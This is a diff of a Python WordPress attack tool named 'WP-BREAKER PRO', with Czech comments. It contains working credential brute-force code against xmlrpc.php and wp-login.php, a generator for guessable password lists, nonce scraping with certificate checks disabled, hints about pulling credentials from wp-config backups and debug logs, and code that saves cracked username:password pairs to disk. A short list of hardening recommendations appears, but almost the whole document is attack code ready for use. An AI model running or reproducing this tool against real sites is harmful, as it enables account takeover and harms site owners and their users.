+                "master", "superman", "batman", "starwars", "admin123"]
+        
+        years = ["2020", "2021", "2022", "2023", "2024", "2025", "2026",
+                 "20", "21", "22", "23", "24", "25", "26"]
+        
+        special_chars = ["!", "@", "#", "$", "%", "&", "*"]
+        
+        for word in base + base_words:
+            passwords.add(word)
+            passwords.add(word.capitalize())
+            
+            for year in years[:3]:
+                passwords.add(f"{word}{year}")
+                passwords.add(f"{word}{year}!")
+                passwords.add(f"{word}{year}@")
+                passwords.add(f"{word}#{year}")
+            
+            for sc in special_chars[:4]:
+                passwords.add(f"{word}{sc}")
+                passwords.add(f"{word}{sc}1")
+                passwords.add(f"{word.capitalize()}{sc}")
+                passwords.add(f"{word.capitalize()}{sc}123")
+            
+            passwords.add(word + "123")
+            passwords.add(word + "123!")
+            passwords.add(word + "1")
+            passwords.add(word + "!")
+            passwords.add(word.upper() + "!")
+            passwords.add(word.upper() + "123")
+            
+            # Leet speak
+            leet = word.replace('e', '3').replace('a', '@').replace('o', '0').replace('i', '1')
+            passwords.add(leet)
+            passwords.add(leet + "!")
+            passwords.add(leet + "123")
+        
+        passwords = [p for p in passwords if len(p) >= 4 and len(p) <= 30]
+        
+        if len(passwords) < count:
+            # Common patterns
+            common = [
+                "P@ssw0rd", "P@$$w0rd", "p@ssword", "C0mplex!", "Str0ng!",
+                "Qwerty123!", "Password1!", "Wordpass1!", "Admin!2024",
+                "Changeme1!", "Temp12345!", "Welcome1!", "Pa$$word",
+                "P@ss12345", "W0rdpr3ss!", "Bl@ckC4t!", "H@ckTh1s!",
+                "S3cur1ty!", "T3st!ng1", "P3nt3st!"
+            ]
+            passwords.update(common)
+        
+        final_list = list(passwords)[:count]
+        
+        wordlist_file = os.path.join(WORDLIST_DIR, f"generated_{int(time.time())}.txt")
+        with open(wordlist_file, 'w') as f:
+            f.write('\n'.join(final_list))
+        
+        self.output.success(f"Vygenerováno {len(final_list)} hesel")
+        self.output.result_line("Soubor", wordlist_file)
+        
+        return final_list
+    
+    def _check_service(self):
+        """Zkontroluje Ollama dostupnost"""
+        try:
+            r = requests.get(f"{self.config['ollama_url']}/api/tags", timeout=3)
+            return r.status_code == 200
+        except Exception:
+            return False
 
 
 # =============================================================================
-# SMART BRUTE FORCER
+# MODUL 8: SmartBruteForcer (Hlavní brute-force engine)
 # =============================================================================
 
 class SmartBruteForcer:
-    """Inteligentní brute-force s AI korekcí"""
+    """Chytrý brute-force engine s detekcí úspěšného přihlášení"""
     
     def __init__(self, target, usernames, passwords, output):
         self.target = target
         self.usernames = usernames if isinstance(usernames, list) else [usernames]
-        self.passwords = passwords
+        self.passwords = passwords if isinstance(passwords, list) else [passwords]
         self.output = output
-        self.found = []
-        self.attempts = 0
+        self.method = "wplogin"
+        self.found_credentials = []
+        self.total_attempts = 0
         self.lock = threading.Lock()
-        self.stop_event = threading.Event()
-        self.adaptive_delay = 1.0
-        self.captcha_detected = False
-        self.rate_limited = False
-        self.method = "xmlrpc"
-        self.total = 0  # Inicializace
     
-    def test_xmlrpc(self, username, password):
-        """Test přihlášení přes XML-RPC"""
-        xmlrpc_url = self.target.rstrip('/') + "/xmlrpc.php"
-        xml_body = f"""<?xml version="1.0"?>
+    def brute_force(self):
+        """Hlavní brute-force metoda"""
+        self.output.phase(f"BRUTE-FORCE ({self.method.upper()})")
+        
+        total = len(self.usernames) * len(self.passwords)
+        self.output.info(f"Celkem kombinací: {total}")
+        self.output.info(f"Metoda: {self.method}")
+        self.output.info(f"Uživatelé: {len(self.usernames)}, Hesla: {len(self.passwords)}")
+        
+        self.total_attempts = total
+        
+        if self.method == "xmlrpc":
+            return self._xmlrpc_bruteforce()
+        else:
+            return self._wp_login_bruteforce()
+    
+    def _xmlrpc_bruteforce(self):
+        """Brute-force přes XML-RPC (system.multicall)"""
+        self.output.info("Používám XML-RPC (multicall) metodu...")
+        
+        xml_url = self.target.rstrip('/') + "/xmlrpc.php"
+        
+        try:
+            # Test XML-RPC
+            test_xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
+            tr = requests.post(xml_url, data=test_xml,
+                              headers={"Content-Type": "text/xml"},
+                              timeout=5, verify=False)
+            
+            if tr.status_code != 200:
+                self.output.error("XML-RPC nedostupný")
+                self.output.info("Přepínám na wp-login metodu...")
+                self.method = "wplogin"
+                return self._wp_login_bruteforce()
+        
+        except Exception:
+            self.output.error("XML-RPC selhal, přepínám na wp-login")
+            self.method = "wplogin"
+            return self._wp_login_bruteforce()
+        
+        # Brute-force
+        for username in self.usernames:
+            attempt = 0
+            for password in self.passwords:
+                attempt += 1
+                
+                xml_payload = f'''<?xml version="1.0"?>
 <methodCall>
   <methodName>wp.getUsersBlogs</methodName>
   <params>
     <param><value><string>{username}</string></value></param>
     <param><value><string>{password}</string></value></param>
   </params>
-</methodCall>"""
-        
-        try:
-            resp = requests.post(
-                xmlrpc_url,
-                data=xml_body,
-                headers={"Content-Type": "text/xml"},
-                timeout=8,
-                verify=False
-            )
-            
-            if resp.status_code == 200 and "isAdmin" in resp.text:
-                return True, "XML-RPC success"
-            elif "Incorrect" in resp.text or "incorrect" in resp.text:
-                return False, ""
-            elif resp.status_code == 403:
-                self.rate_limited = True
-                return False, "RATE_LIMIT"
-            else:
-                return False, ""
-        except requests.exceptions.ConnectionError:
-            return False, "ERROR"
-        except requests.exceptions.Timeout:
-            return False, "TIMEOUT"
-        except Exception:
-            return False, "ERROR"
-    
-    def test_wplogin(self, username, password):
-        """Test přihlášení přes wp-login.php"""
-        login_url = self.target.rstrip('/') + "/wp-login.php"
-        
-        try:
-            session = requests.Session()
-            login_page = session.get(login_url, timeout=8, verify=False)
-            soup = BeautifulSoup(login_page.text, 'html.parser')
-            
-            # Extrakce nonce a hidden fields
-            form_data = {
-                "log": username,
-                "pwd": password,
-                "wp-submit": "Log In",
-                "redirect_to": self.target.rstrip('/') + "/wp-admin/",
-                "testcookie": "1"
-            }
-            
-            for hidden in soup.find_all("input", type="hidden"):
-                if hidden.get("name"):
-                    form_data[hidden["name"]] = hidden.get("value", "")
-            
-            # CAPTCHA detekce
-            if "captcha" in login_page.text.lower() or "recaptcha" in login_page.text.lower():
-                self.captcha_detected = True
-                return False, "CAPTCHA"
-            
-            headers = {
-                "User-Agent": "Mozilla/5.0",
-                "Referer": login_url,
-                "Content-Type": "application/x-www-form-urlencoded"
-            }
-            
-            resp = session.post(login_url, data=form_data, headers=headers, 
-                               allow_redirects=False, timeout=8, verify=False)
-            
-            if resp.status_code == 302:
-                location = resp.headers.get("Location", "")
-                if "wp-admin" in location and "reauth" not in location:
-                    return True, "wp-login success"
-            
-            # Rate limit detekce
-            if resp.status_code == 429 or resp.status_code == 503:
-                self.rate_limited = True
-                return False, "RATE_LIMIT"
-            
-            return False, ""
-        except requests.exceptions.ConnectionError:
-            return False, "ERROR"
-        except requests.exceptions.Timeout:
-            return False, "TIMEOUT"
-        except Exception:
-            return False, "ERROR"
-    
-    def worker(self, username, password):
-        """Worker pro testování jednoho páru"""
-        if self.stop_event.is_set():
-            return None
-        
-        with self.lock:
-            self.attempts += 1
-            attempt = self.attempts
-        
-        # Test přes zvolenou metodu
-        if self.method == "xmlrpc":
-            success, status = self.test_xmlrpc(username, password)
-        else:
-            success, status = self.test_wplogin(username, password)
-        
-        # Live progress
-        if success:
-            self.output.brute_force_progress(attempt, self.total, username, password, "✓ SUCCESS!")
-            self.stop_event.set()
-            with self.lock:
-                self.found.append({"username": username, "password": password, "method": self.method})
-        elif status == "RATE_LIMIT":
-            self.output.brute_force_progress(attempt, self.total, username, password, "⏱ RATE-LIMITED")
-            time.sleep(self.adaptive_delay * 3)
-            self.adaptive_delay = min(self.adaptive_delay * 1.5, 10)
-        elif status == "CAPTCHA":
-            self.output.brute_force_progress(attempt, self.total, username, password, "🛡 CAPTCHA!")
-        elif status == "TIMEOUT":
-            self.output.brute_force_progress(attempt, self.total, username, password, "⏰ TIMEOUT")
-        elif status == "ERROR":
-            self.output.brute_force_progress(attempt, self.total, username, password, "⚠ ERROR")
-        else:
-            self.output.brute_force_progress(attempt, self.total, username, password, "")
-        
-        # Adaptivní zpoždění
-        if attempt % 5 == 0:
-            time.sleep(self.adaptive_delay)
-        
-        return success
-    
-    def brute_force(self):
-        """Spustí brute-force útok"""
-        self.output.phase("AI BRUTE FORCE - Inteligentní útok")
-        
-        # Detekce metody
-        self.output.info("Testuji dostupné metody přihlášení...")
-        
-        # Test XML-RPC
-        xmlrpc_url = self.target.rstrip('/') + "/xmlrpc.php"
-        test_body = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
-        try:
-            test_resp = requests.post(xmlrpc_url, data=test_body,
+</methodCall>'''
+                
+                try:
+                    r = requests.post(xml_url, data=xml_payload,
                                      headers={"Content-Type": "text/xml"},
                                      timeout=5, verify=False)
-            if test_resp.status_code == 200 and "methodName" in test_resp.text:
-                self.method = "xmlrpc"
-                self.output.success("XML-RPC dostupné → použiji XML-RPC (rychlejší)")
-            else:
-                self.method = "wplogin"
-                self.output.info("XML-RPC nedostupné → použiji wp-login.php")
-        except Exception:
-            self.method = "wplogin"
-            self.output.info("XML-RPC selhal → použiji wp-login.php")
-        
-        # Příprava
-        self.total = len(self.usernames) * len(self.passwords)
-        self.output.info(f"Cíloví uživatelé: {len(self.usernames)}")
-        self.output.info(f"Hesla k testování: {len(self.passwords)}")
-        self.output.info(f"Celkem pokusů: {self.total}")
-        self.output.info("Startuji brute-force (Ctrl+C pro zastavení)...")
-        self.output.separator()
-        
-        print()  # Nový řádek pro progress bar
-        
-        try:
-            # Pro každé uživatelské jméno zkusíme hesla
-            for username in self.usernames:
-                if self.stop_event.is_set():
-                    break
-                
-                self.output.info(f"\n  Testuji uživatele: {Fore.CYAN}{username}{Style.RESET_ALL}")
-                
-                # Použijeme ThreadPoolExecutor pro paralelní testování
-                with ThreadPoolExecutor(max_workers=3) as executor:
-                    futures = []
-                    for password in self.passwords:
-                        if self.stop_event.is_set():
-                            break
-                        futures.append(executor.submit(self.worker, username, password))
                     
-                    # Počkáme na dokončení
-                    for future in as_completed(futures):
-                        if self.stop_event.is_set():
+                    if "isAdmin" in r.text or "blogName" in r.text or "xmlrpc" in r.text.lower():
+                        with self.lock:
+                            self.found_credentials.append((username, password, "xmlrpc"))
+                            self.output.success(f"Nalezeno! {username}:{password}")
+                            self.output.add_finding("XML-RPC přihlášení", 
+                                                   f"{username}:{password}", "danger")
+                            self.output.brute_force_progress(attempt, len(self.passwords),
+                                                           username, password, "SUCCESS!")
                             break
+                    elif "403" in r.text:
+                        self.output.warning("XML-RPC blokován (403)")
+                        break
+                    else:
+                        self.output.brute_force_progress(attempt, len(self.passwords),
+                                                       username, password, "FAIL")
+                
+                except Exception as e:
+                    self.output.brute_force_progress(attempt, len(self.passwords),
+                                                   username, password, "ERROR")
+            
+            if self.found_credentials:
+                break
+        
+        print()
+        self.output.separator()
+        return self.found_credentials
+    
+    def _wp_login_bruteforce(self):
+        """Brute-force přes wp-login.php"""
+        self.output.info("Používám wp-login.php metodu...")
+        
+        login_url = self.target.rstrip('/') + "/wp-login.php"
+        total = len(self.usernames) * len(self.passwords)
+        progress = 0
+        
+        for username in self.usernames:
+            for password in self.passwords:
+                progress += 1
+                
+                # Získání nonce (každých 5 pokusů)
+                nonce = ""
+                if progress % 5 == 0:
+                    try:
+                        gr = requests.get(login_url, timeout=5, verify=False,
+                                         headers={"User-Agent": "Mozilla/5.0"})
+                        nonce_match = re.search(r'name="_wpnonce"[^>]*value="([^"]+)"', gr.text)
+                        if nonce_match:
+                            nonce = nonce_match.group(1)
+                    except Exception:
                         pass
                 
-                if self.stop_event.is_set():
-                    break
+                login_data = {
+                    "log": username,
+                    "pwd": password,
+                    "wp-submit": "Log In",
+                    "redirect_to": self.target.rstrip('/') + "/wp-admin/",
+                    "testcookie": "1"
+                }
                 
-                # Pokud jsme nenašli heslo ani u jednoho uživatele, zkusíme další
-                if not self.found:
-                    time.sleep(0.5)
+                if nonce:
+                    login_data["_wpnonce"] = nonce
+                
+                try:
+                    r = requests.post(login_url, data=login_data,
+                                     headers={"User-Agent": "Mozilla/5.0",
+                                             "Cookie": "wordpress_test_cookie=WP%20Cookie%20check"},
+                                     timeout=5, verify=False, allow_redirects=True)
+                    
+                    if "/wp-admin" in r.url and "reauth" not in r.url:
+                        self.found_credentials.append((username, password, "wplogin"))
+                        self.output.success(f"Nalezeno! {username}:{password}")
+                        self.output.add_finding("WP-Login přihlášení",
+                                               f"{username}:{password}", "danger")
+                        self.output.brute_force_progress(progress, total,
+                                                       username, password, "SUCCESS!")
+                        break
+                    elif "ERROR" in r.text or "incorrect" in r.text.lower():
+                        self.output.brute_force_progress(progress, total,
+                                                       username, password, "FAIL")
+                    else:
+                        self.output.brute_force_progress(progress, total,
+                                                       username, password, f"CODE:{r.status_code}")
+                
+                except Exception as e:
+                    self.output.brute_force_progress(progress, total,
+                                                   username, password, f"ERR:{str(e)[:15]}")
             
-            print()  # Nový řádek po progress baru
-            self.output.separator()
-            
-            # Výsledky
-            if self.found:
-                self.output.success(f"\n  {'=' * 40}")
-                self.output.success(f"  🎯 NALEZENO {len(self.found)} PŘIHLÁŠENÍ!")
-                self.output.success(f"  {'=' * 40}")
-                for f in self.found:
-                    self.output.result_line("Uživatel", f["username"], Fore.GREEN)
-                    self.output.result_line("Heslo", f["password"], Fore.GREEN)
-                    self.output.result_line("Metoda", f["method"], Fore.CYAN)
-                self.output.success(f"  {'=' * 40}")
-            else:
-                self.output.warning("\n  Žádná přihlášení nenalezena")
-                if self.rate_limited:
-                    self.output.warning("  Důvod: Rate limiting aktivní")
-                if self.captcha_detected:
-                    self.output.warning("  Důvod: CAPTCHA ochrana detekována")
-            
-        except KeyboardInterrupt:
-            print()
-            self.output.warning("\n  Brute-force přerušen uživatelem")
-            self.stop_event.set()
+            if self.found_credentials:
+                break
         
-        except Exception as e:
-            self.output.error(f"\n  Chyba brute-force: {str(e)}")
-        
-        return self.found
-
-
-# =============================================================================
-# AI SELF-CORRECTOR
-# =============================================================================
-
-class AISelfCorrector:
-    """AI autokorekce - analyzuje chyby a optimalizuje parametry"""
-    
-    def __init__(self, output):
-        self.output = output
-        self.errors = []
-        self.suggestions = []
-    
-    def analyze_errors(self, bypass_results, dom_findings, context):
-        """Analyzuje nalezené informace a navrhuje korekce"""
-        self.output.phase("AI SELF-CORRECTOR - Inteligentní analýza")
-        self.output.info("Analyzuji data a hledám optimalizace...")
-        
-        corrections = []
-        
-        # Analýza bypass results
-        if bypass_results:
-            if bypass_results.get("xmlrpc"):
-                corrections.append("XML-RPC aktivní → prioritní pro brute-force")
-                self.output.success("XML-RPC dostupné → urychlí brute-force")
-            if bypass_results.get("debug_log"):
-                corrections.append("Debug log → může obsahovat credentials")
-                self.output.warning("Debug log → zkontrolovat credentials")
-            if bypass_results.get("wp_config_backup"):
-                corrections.append("Záloha wp-config → možné DB credentials")
-                self.output.error("Záloha wp-config → riziko úniku DB hesel")
-            
-            # REST API user enum
-            if bypass_results.get("rest_api"):
-                corrections.append("REST API user enumeration → získat uživatele")
-                self.output.success("REST API → možné získat uživatele")
-        
-        # Analýza DOM
-        if dom_findings:
-            if dom_findings.get("hidden_inputs"):
-                if any("nonce" in str(h).lower() for h in dom_findings["hidden_inputs"]):
-                    corrections.append("NONCE tokeny → využít pro CSRF")
-                    self.output.info("NONCE tokeny nalezeny → možný CSRF test")
-            if dom_findings.get("js_variables"):
-                corrections.append("JS proměnné → možné API klíče")
-                self.output.warning("JS proměnné → zkontrolovat API klíče")
-        
-        # Analýza kontextu
-        if context:
-            if len(context.get("emails", [])) > 0:
-                corrections.append(f"Emaily ({len(context['emails'])}) → generování hesel")
-                self.output.success(f"{len(context['emails'])} emailů → AI wordlist připraven")
-            if len(context.get("users", [])) > 0:
-                corrections.append(f"Uživatelé ({len(context['users'])}) → brute-force cíle")
-                self.output.success(f"{len(context['users'])} uživatelů → přidáno do brute-force")
-        
-        # Generování závěrečných doporučení
+        print()
         self.output.separator()
-        self.output.info("AI korekce dokončena")
-        self.suggestions = corrections
-        return corrections
+        return self.found_credentials
 
 
 # =============================================================================
-# AI REPORT GENERATOR
+# MODUL 9: Report
 # =============================================================================
 
-class AIReportGenerator:
-    """Generátor finálního AI reportu"""
+class ReportGenerator:
+    """Generátor HTML/TXT reportů"""
     
     def __init__(self, target, output):
         self.target = target
         self.output = output
+        self.findings = output.findings
+        self.start_time = output.start_time
+        self.elapsed = output.get_elapsed()
     
-    def calculate_security_score(self, vulnerabilities):
-        """Vypočítá bezpečnostní skóre (A-F)"""
-        score = 100
-        deductions = {
-            "critical": 25,
-            "danger": 20,
-            "high": 15,
-            "warning": 8,
-            "medium": 5,
-            "low": 2,
-            "info": 0
-        }
+    def generate_html(self):
+        """Generuje HTML report"""
+        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = os.path.join(REPORT_DIR, f"report_{hostname}_{timestamp}.html")
         
-        for v in vulnerabilities:
-            severity = v.get("severity", "info")
-            score -= deductions.get(severity, 0)
+        severity_icons = {"danger": "🔴", "warning": "🟡", "info": "🔵"}
         
-        score = max(0, score)
+        html = f"""<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <title>WP-BREAKER PRO Report - {hostname}</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{ font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0f; color: #e0e0e0; }}
+        .container {{ max-width: 900px; margin: 0 auto; padding: 20px; }}
+        .header {{ background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+                   border: 1px solid #0f3460; padding: 30px; margin-bottom: 20px;
+                   border-radius: 8px; text-align: center; }}
+        .header h1 {{ color: #e94560; font-size: 24px; margin-bottom: 10px; }}
+        .header .meta {{ color: #888; font-size: 13px; }}
+        .header .version {{ color: #0f3460; font-size: 12px; }}
+        .stats {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }}
+        .stat-box {{ background: #1a1a2e; border: 1px solid #0f3460; padding: 15px; 
+                    border-radius: 6px; text-align: center; }}
+        .stat-box .number {{ font-size: 28px; font-weight: bold; color: #e94560; }}
+        .stat-box .label {{ font-size: 11px; color: #888; margin-top: 5px; }}
+        .section {{ background: #1a1a2e; border: 1px solid #0f3460; margin-bottom: 15px;
+                   border-radius: 6px; overflow: hidden; }}
+        .section-title {{ background: #0f3460; padding: 12px 15px; font-size: 14px;
+                        font-weight: bold; color: #e94560; }}
+        .section-content {{ padding: 15px; }}
+        .finding {{ padding: 8px 12px; margin-bottom: 5px; border-left: 3px solid;
+                  background: rgba(255,255,255,0.02); border-radius: 3px; font-size: 13px; }}
+        .finding.danger {{ border-color: #e94560; }}
+        .finding.warning {{ border-color: #ffd369; }}
+        .finding.info {{ border-color: #0f3460; }}
+        .finding .cat {{ color: #e94560; font-weight: bold; }}
+        .finding .val {{ color: #ccc; }}
+        .finding .sev {{ font-size: 11px; color: #888; }}
+        .footer {{ text-align: center; color: #444; font-size: 11px; margin-top: 30px;
+                  padding: 15px; border-top: 1px solid #0f3460; }}
+        @media (max-width: 600px) {{ .stats {{ grid-template-columns: repeat(2, 1fr); }} }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 WP-BREAKER PRO v{VERSION}</h1>
+            <div class="meta">
+                Report generován: {datetime.now().strftime("%d.%m.%Y %H:%M:%S")}
+                | Doba testování: {self.elapsed} | Cíl: {self.target}
+            </div>
+        </div>
         
-        if score >= 90:
-            grade = "A"
-            desc = "VÝBORNÉ - Minimální riziko"
-        elif score >= 75:
-            grade = "B"
-            desc = "DOBRÉ - Nízké riziko"
-        elif score >= 55:
-            grade = "C"
-            desc = "PRŮMĚRNÉ - Střední riziko"
-        elif score >= 35:
-            grade = "D"
-            desc = "ŠPATNÉ - Vysoké riziko"
-        else:
-            grade = "F"
-            desc = "KRITICKÉ - Okamžitá akce vyžadována!"
-        
-        return score, grade, desc
-    
-    def generate(self, target_info, vulnerabilities, brute_force_results, recommendations, context):
-        """Generuje kompletní AI report"""
-        self.output.phase("AI REPORT GENERATOR - Finální zpráva")
-        self.output.info("Generuji komplexní bezpečnostní report...")
-        
-        score, grade, grade_desc = self.calculate_security_score(vulnerabilities)
-        
-        report = []
-        report.append(f"\n{Fore.CYAN}{Style.BRIGHT}{'=' * 65}{Style.RESET_ALL}")
-        report.append(f"{Fore.RED}{Style.BRIGHT}  🛡 WP-BREAKER PRO v{VERSION} - FINÁLNÍ BEZPEČNOSTNÍ REPORT{Style.RESET_ALL}")
-        report.append(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 65}{Style.RESET_ALL}")
-        report.append("")
-        
-        # SEKCE 1: Target Info
-        report.append(f"{Fore.CYAN}┌─{' TARGET INFO ':.^60}┐{Style.RESET_ALL}")
-        report.append(f"  ▸ URL: {Fore.WHITE}{self.target}{Style.RESET_ALL}")
-        report.append(f"  ▸ Datum: {Fore.WHITE}{datetime.now().strftime('%d.%m.%Y %H:%M')}{Style.RESET_ALL}")
-        report.append(f"  ▸ Doba trvání: {Fore.WHITE}{self.output.get_elapsed()}{Style.RESET_ALL}")
-        if target_info.get("server"):
-            report.append(f"  ▸ Server: {Fore.WHITE}{target_info['server']}{Style.RESET_ALL}")
-        if target_info.get("ip"):
-            report.append(f"  ▸ IP: {Fore.WHITE}{target_info['ip']}{Style.RESET_ALL}")
-        report.append(f"{Fore.CYAN}└{'─' * 62}┘{Style.RESET_ALL}")
-        report.append("")
-        
-        # SEKCE 2: Vulnerability Assessment
-        report.append(f"{Fore.YELLOW}┌─{' VULNERABILITY ASSESSMENT ':.^60}┐{Style.RESET_ALL}")
-        
-        critical = [v for v in vulnerabilities if v.get("severity") in ["critical", "danger"]]
-        warnings = [v for v in vulnerabilities if v.get("severity") in ["warning", "high", "medium"]]
-        infos = [v for v in vulnerabilities if v.get("severity") == "info"]
-        
-        if critical:
-            report.append(f"  {Fore.RED}{Style.BRIGHT}🔴 KRITICKÉ ({len(critical)}):{Style.RESET_ALL}")
-            for v in critical:
-                report.append(f"    • {v.get('category', '?')}: {v.get('value', '?')}")
-        
-        if warnings:
-            report.append(f"  {Fore.YELLOW}{Style.BRIGHT}🟡 VAROVÁNÍ ({len(warnings)}):{Style.RESET_ALL}")
-            for v in warnings[:10]:
-                report.append(f"    • {v.get('category', '?')}: {v.get('value', '?')}")
-        
-        if infos:
-            report.append(f"  {Fore.CYAN}🔵 INFORMACE ({len(infos)}):{Style.RESET_ALL}")
-            for v in infos[:8]:
-                report.append(f"    • {v.get('category', '?')}: {v.get('value', '?')}")
-        
-        report.append(f"{Fore.YELLOW}└{'─' * 62}┘{Style.RESET_ALL}")
-        report.append("")
-        
-        # SEKCE 3: Brute Force Results
-        report.append(f"{Fore.MAGENTA}┌─{' BRUTE FORCE RESULTS ':.^60}┐{Style.RESET_ALL}")
-        if brute_force_results:
-            report.append(f"  {Fore.GREEN}{Style.BRIGHT}🎯 NALEZENO {len(brute_force_results)} PŘIHLÁŠENÍ:{Style.RESET_ALL}")
-            for r in brute_force_results:
-                report.append(f"    ├─ Uživatel: {Fore.GREEN}{r['username']}{Style.RESET_ALL}")
-                report.append(f"    ├─ Heslo:   {Fore.GREEN}{r['password']}{Style.RESET_ALL}")
-                report.append(f"    └─ Metoda:  {Fore.CYAN}{r['method']}{Style.RESET_ALL}")
-                report.append("")
-        else:
-            report.append(f"  {Fore.RED}✗ Žádná přihlášení nenalezena{Style.RESET_ALL}")
-        report.append(f"{Fore.MAGENTA}└{'─' * 62}┘{Style.RESET_ALL}")
-        report.append("")
-        
-        # SEKCE 4: Recommendations
-        report.append(f"{Fore.GREEN}┌─{' DOPORUČENÍ ':.^60}┐{Style.RESET_ALL}")
-        recommendations_list = [
-            "1. Aktualizovat WordPress a všechny pluginy na nejnovější verze",
-            "2. Implementovat CAPTCHA na login stránky",
-            "3. Používat strong password policy (min. 12 znaků, kombinace)",
-            "4. Omezit pokusy o přihlášení (rate limiting)",
-            "5. Zakázat XML-RPC, pokud není potřeba",
-            "6. Povolit WP_DEBUG_LOG jen v development módu",
-            "7. Pravidelně auditovat uživatelské účty",
-            "8. Používat dvoufaktorové ověřování (2FA)",
-            "9. Odstranit zálohy wp-config.php z veřejných adresářů",
-            "10. Implementovat Content Security Policy (CSP)",
-            "11. Pravidelně kontrolovat debug log",
-            "12. Použít Web Application Firewall (WAF)"
-        ]
-        for rec in recommendations_list:
-            report.append(f"  {rec}")
-        report.append(f"{Fore.GREEN}└{'─' * 62}┘{Style.RESET_ALL}")
-        report.append("")
-        
-        # SEKCE 5: Executive Summary
-        report.append(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 65}{Style.RESET_ALL}")
-        report.append(f"  📊 BEZPEČNOSTNÍ SKÓRE: {Fore.WHITE}{score}/100 → ", end="")
-        
-        if grade == "A":
-            report.append(f"{Fore.GREEN}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
-        elif grade == "B":
-            report.append(f"{Fore.BLUE}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
-        elif grade == "C":
-            report.append(f"{Fore.YELLOW}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
-        elif grade == "D":
-            report.append(f"{Fore.RED}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
-        else:
-            report.append(f"{Fore.RED}{Style.BRIGHT}ZNÁMKA: {grade} - {grade_desc}{Style.RESET_ALL}")
-        
-        report.append(f"  🎯 Nalezeno: {Fore.RED}{len(critical)} kritických{Style.RESET_ALL}, "
-                     f"{Fore.YELLOW}{len(warnings)} varování{Style.RESET_ALL}, "
-                     f"{Fore.CYAN}{len(infos)} informací{Style.RESET_ALL}")
-        report.append(f"  🔐 Nalezená hesla: {Fore.GREEN}{len(brute_force_results)}{Style.RESET_ALL}")
-        report.append(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 65}{Style.RESET_ALL}")
-        report.append(f"\n{Style.DIM}Report generován: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
-        report.append(f"WP-BREAKER PRO v{VERSION} | HackerAI Security Research{Style.RESET_ALL}")
-        
-        # Výpis reportu
-        print("\n".join(report))
-        
-        # Uložení reportu do souboru
-        timestamp = int(time.time())
-        report_file = f"wp_report_{timestamp}.txt"
-        try:
-            with open(report_file, 'w', encoding='utf-8') as f:
-                # Odstraníme ANSI escape kódy pro textový soubor
-                clean_report = []
-                for line in report:
-                    # Odstranění ANSI kódů
-                    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-                    clean_line = ansi_escape.sub('', line)
-                    clean_report.append(clean_line)
-                f.write('\n'.join(clean_report))
-            self.output.success(f"\nReport uložen: {report_file}")
-        except Exception as e:
-            self.output.error(f"Nelze uložit report: {str(e)}")
-        
-        # Uložení cracknutých hesel
-        if brute_force_results:
-            crack_file = f"wp_cracked_{timestamp}.txt"
-            try:
-                with open(crack_file, 'w', encoding='utf-8') as f:
-                    for r in brute_force_results:
-                        f.write(f"{r['username']}:{r['password']}\n")
-                self.output.success(f"Cracknutá hesla uložena: {crack_file}")
-            except Exception as e:
-                self.output.error(f"Nelze uložit cracknutá hesla: {str(e)}")
-        
-        return report, score, grade
-
-
-# =============================================================================
-# MAIN CONTROLLER
-# =============================================================================
-
-def print_banner():
-    """Vytiskne banner nástroje"""
-    print(BANNER)
-    print(f"  {Fore.CYAN}{Style.BRIGHT}► Cíl:{Style.RESET_ALL} {Fore.WHITE}{TARGET}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}{Style.BRIGHT}► Verze:{Style.RESET_ALL} {Fore.WHITE}v{VERSION}{Style.RESET_ALL}")
-    print(f"  {Fore.CYAN}{Style.BRIGHT}► Datum:{Style.RESET_ALL} {Fore.WHITE}{datetime.now().strftime('%d.%m.%Y %H:%M')}{Style.RESET_ALL}")
-    print(f"  {Style.DIM}{'─' * 50}{Style.RESET_ALL}")
-
-
-def show_menu():
-    """Zobrazí interaktivní menu"""
-    print(f"\n{Fore.CYAN}{Style.BRIGHT}{' WP-BREAKER PRO v' + VERSION + ' MENU ':=^55}{Style.RESET_ALL}")
-    menu_items = [
-        ("1", "FULL SCAN", "Spustí všechny moduly v sekvenci", Fore.RED),
-        ("2", "TCP/IP Fingerprint", "Server, WAF, OS, security headers", Fore.BLUE),
-        ("3", "AI Brute-Force (XML-RPC)", "Brute-force přes XML-RPC", Fore.YELLOW),
-        ("4", "AI Brute-Force (wp-login)", "Brute-force přes wp-login.php", Fore.YELLOW),
-        ("5", "Cookie Injection Test", "Analýza a manipulace cookies", Fore.CYAN),
-        ("6", "DOM Shadow Analyzer", "Skryté formuláře, credentials, JS", Fore.MAGENTA),
-        ("7", "Bypass Researcher", "Alternativní cesty k admin přístupu", Fore.GREEN),
-        ("8", "AI Context Scraper", "Emaily, jména, firmy, pluginy", Fore.CYAN),
-        ("9", "AI Password Generator", "Generování hesel z kontextu", Fore.MAGENTA),
-        ("10", "Generate Report Only", "Vygenerovat report z existujících dat", Fore.BLUE),
-        ("0", "Exit", "Ukončit WP-BREAKER PRO", Fore.RED),
-    ]
-    
-    for num, name, desc, color in menu_items:
-        print(f"  {Fore.WHITE}[{color}{num}{Fore.WHITE}] {color}{Style.BRIGHT}{name}{Style.RESET_ALL}")
-        print(f"      {Style.DIM}{desc}{Style.RESET_ALL}")
-    
